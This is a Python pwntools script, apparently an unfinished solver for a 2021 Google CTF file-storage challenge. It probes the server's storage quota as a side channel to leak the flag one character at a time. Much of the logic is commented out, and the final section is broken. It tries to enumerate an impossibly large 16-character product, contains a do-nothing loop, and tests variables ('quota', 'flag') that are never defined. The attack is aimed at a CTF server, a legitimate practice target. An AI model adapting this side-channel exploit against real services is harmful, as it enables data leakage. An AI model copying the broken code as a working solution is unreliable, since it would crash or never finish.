# -*- coding: utf-8 -*-
from pwn import *
import string
from itertools import product
import re

conn = remote('filestore.2021.ctfcompetition.com', 1337)
conn.recvuntil("exit")
conn.sendline(b"status")

received = conn.recvuntil(b"Menu").decode()
match = re.search(r"Quota: (.+)/64.000kB", received)

target_quota = match[1]

conn.close()

# valid = []

# for char in string.printable[:-6]:
#     conn = remote('filestore.2021.ctfcompetition.com', 1337)
#     conn.recvuntil("exit")
#     conn.sendline(b"store")
#     conn.recv()
#     conn.sendline(f"{char}")
#     conn.recvuntil("Menu")

#     conn.sendline(b"status")
#     received = conn.recvuntil("Menu").decode()
#     match = re.search(r"Quota: (.+)/64.000kB", received)

#     quota = match[1]
#     if quota == target_quota:
#         print(f"{char} works!")
#         valid.append(char)

#     conn.close()

# print(valid)

#################################################################
flaglist = []
valid = ['0', '1', '3', '4', 'c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '_', '{', '}']
# conn = remote('filestore.2021.ctfcompetition.com', 1337)
# conn.recvuntil("exit")

flaglist = list(product(valid, repeat = 16))
i = 2
while i < 16:
    
    i = i * 2
    # for char in product(valid):
    #     print(char)
    

#     conn.sendline(b"store")
#     conn.recv()
#     conn.sendline(f"{flag}")
#     conn.recvuntil("Menu")
        
#     conn.sendline(b"status")
#     received = conn.recvuntil("Menu").decode()
#     match = re.search(r"Quota: (.+)/64.000kB", received)
        
# quota = match[1]
        
if quota == target_quota:
    print(f"the first flag is {flag}!")
